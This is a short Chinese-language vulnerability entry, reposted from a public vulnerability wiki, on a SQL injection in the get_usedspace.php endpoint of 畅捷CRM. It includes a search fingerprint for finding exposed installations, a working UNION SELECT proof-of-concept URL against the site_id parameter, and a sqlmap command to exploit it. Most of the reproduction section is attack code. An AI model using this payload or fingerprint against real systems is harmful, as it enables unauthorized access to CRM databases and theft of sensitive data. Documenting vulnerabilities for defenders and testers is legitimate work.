---
title: "畅捷CRM get_usedspace.php SQL注入漏洞"
date: 2026-10-16 09:11:17
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "畅捷CRM"
tags:
  - "畅捷CRM"
  - "SQL注入"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

畅捷CRM get_usedspace.php存在SQL漏洞，通过漏洞可获取数据库敏感信息

## 漏洞影响

```
畅捷CRM
```

## 网络测绘

```
title="畅捷CRM"
```

## 漏洞复现

登录页面

![image-20220525145239822](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251452933.png)

验证POC

```
/webservice/get_usedspace.php?site_id=-1159 UNION ALL SELECT CONCAT(0x76756c6e,0x76756c6e,0x76756c6e)--
```

![image-20220525145324633](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251453704.png)

使用Sqlmap验证漏洞

```
sqlmap -u "http://xxx.xxx.xxx.xxx:8000/webservice/get_usedspace.php?site_id=1" -p site_id
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E7%95%85%E6%8D%B7CRM-get_usedspace.php-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
